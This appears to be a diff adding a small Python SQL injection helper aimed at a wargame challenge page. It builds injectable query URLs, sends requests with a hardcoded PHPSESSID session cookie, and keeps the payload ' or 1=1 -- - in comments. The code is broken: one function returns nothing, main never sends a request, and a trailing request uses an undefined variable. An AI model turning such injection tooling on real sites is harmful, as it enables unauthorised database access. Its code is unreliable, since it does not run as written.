@@ -1,0 +1,70 @@
+#!/usr/bin/python3
+
+import requests
+import re
+from termcolor import colored
+from bs4 import BeautifulSoup as BS
+import sys, getopt
+
+def prepareUrl(url,parameters) :
+    parameters = parameters.split(',')
+    r = url + '?' + ("".join(list(map(lambda x : f'{x}=INJECT' if x == parameters[0] else f'&{x}=INJECT', parameters))))
+    return r
+
+def prepareRequest(url,query):
+    r = url.replace("INJECT",query)
+
+
+def sendRequest(url,cookie):
+    cookies = dict(PHPSESSID=f'{cookie}')
+    r = requests.get(url,cookies=cookies)
+    print(BS(r.text,"html.parser").prettify())
+
+def main(argv):
+
+   url = ''
+   columns = ''
+   query = ''
+   cookie = ''
+   
+   try:
+      opts, args = getopt.getopt(argv,"u:v:q:c:h",["url=","columns=","query=","cookie="])
+   except getopt.GetoptError:
+      print("usage: ./sqli.py -u http://example.com -v \"id,pw\" -q \"query\" -c cookie")
+      sys.exit(2)
+   for opt, arg in opts:
+      if opt == '-h':
+         print("usage: ./sqli.py -u http://example.com -v \"id,pw\" -q \"query\" -c cookie")
+         sys.exit()
+      elif opt in ("-u", "--url"):
+         url = arg
+      elif opt in ("-v", "--columns"):
+         columns = arg
+      elif opt in ("-q", "--query"):
+         query = arg
+      elif opt in ("-c", "--cookie"):
+         cookie = arg
+
+   print(url,columns,query,cookie)
+   r = prepareUrl(url,columns)
+   print(r)
+
+if __name__ == "__main__":
+   main(sys.argv[1:])
+
+
+# url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"
+# parameters = ['id']
+# injection = "' or 1=1 -- -"
+cookie = dict(PHPSESSID='lqjdocrtrts7s5gl84ruvmc5aa')
+
+
+# sqli = "' or 1=1 -- -"
+
+# print(query_url)
+
+http_request=requests.get(query_url,cookies=cookie)
+
+# response_text = BS(http_request.text,"html.parser").prettify()
+
+# print(response_text)
